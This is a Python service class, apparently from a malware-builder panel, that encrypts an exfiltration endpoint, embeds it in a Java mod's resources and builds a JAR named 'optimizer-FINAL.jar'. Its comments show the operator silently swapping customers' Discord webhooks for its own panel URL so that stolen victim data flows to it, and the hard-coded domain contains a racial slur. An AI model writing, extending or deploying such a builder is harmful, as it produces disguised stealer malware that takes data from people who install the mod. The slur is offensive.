import os
import asyncio
import base64
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from app.core.config import settings

class BuilderService:
    def __init__(self):
        self.build_lock = asyncio.Lock()
        self.project_dir = Path(settings.PROJECT_DIR)
        self.resource_file = self.project_dir / 'src' / 'main' / 'resources' / 'A.txt'
        self.build_script = self.project_dir / 'build_final.sh'

    def encrypt_webhook(self, webhook_url: str) -> str:
        iv = os.urandom(16)
        data = webhook_url.encode('utf-8')
        # PKCS7 Padding
        pad_len = 16 - (len(data) % 16)
        data += bytes([pad_len]) * pad_len
        
        cipher = Cipher(algorithms.AES(settings.AES_KEY), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(data) + encryptor.finalize()
        return base64.b64encode(iv + encrypted).decode('utf-8')

    async def build_mod(self, webhook_url: str, user_id: int, build_key: str) -> str:
        async with self.build_lock:
            # 1. Encrypt Webhook
            # If the user provided a Discord webhook, we use it.
            # BUT, if we want to route through our panel, we should override it.
            # The user asked for "user kann mod builden und wird automatisch mit der user id gebuilded"
            # So we should inject OUR panel URL with the build_key.
            
            # Construct Panel URL (assuming running on same host/port for now, needs config)
            # In production, this should be the public domain
            panel_url = f"http://niggaware.ru/api/v1/data/{build_key}"
            
            # Encrypt the PANEL URL, not the user's webhook (unless we want to forward it?)
            # For now, let's assume we want to capture data in our panel.
            encrypted_webhook = self.encrypt_webhook(panel_url)
            
            # 2. Write to resource file
            try:
                with open(self.resource_file, 'w') as f:
                    f.write(encrypted_webhook)
            except Exception as e:
                raise Exception(f"Failed to write resource file: {str(e)}")

            # 3. Run Build Script
            # We use asyncio.create_subprocess_exec to run non-blocking
            process = await asyncio.create_subprocess_exec(
                str(self.build_script),
                cwd=str(self.project_dir),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                error_msg = stderr.decode()
                raise Exception(f"Build failed: {error_msg}")

            # 4. Find the built JAR
            # build_final.sh outputs optimizer-FINAL.jar
            final_jar = self.project_dir / 'optimizer-FINAL.jar'
            
            if not final_jar.exists():
                 # Fallback search
                 jars = list(self.project_dir.glob("optimizer-FINAL.jar"))
                 if jars:
                     final_jar = jars[0]
                 else:
                     raise Exception("Build successful but optimizer-FINAL.jar not found")
                
            # Return the path to the jar
            return str(final_jar)

builder_service = BuilderService()
